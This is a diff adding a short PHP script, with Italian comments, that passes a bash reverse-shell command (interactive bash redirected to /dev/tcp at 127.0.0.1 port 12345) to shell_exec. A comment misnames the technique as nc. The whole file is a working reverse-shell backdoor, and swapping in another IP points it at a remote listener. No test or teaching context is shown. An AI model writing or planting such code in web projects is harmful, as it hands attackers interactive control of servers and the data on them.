@@ -1,0 +1,9 @@
+<?php
+// Indirizzo IP e porta a cui connettersi (localhost)
+$ip = '127.0.0.1';
+$port = 12345;
+
+// Esegui il comando nc per stabilire una connessione di rete
+$cmd = "/bin/bash -c 'bash -i >& /dev/tcp/{$ip}/{$port} 0>&1'";
+shell_exec($cmd);
+?>
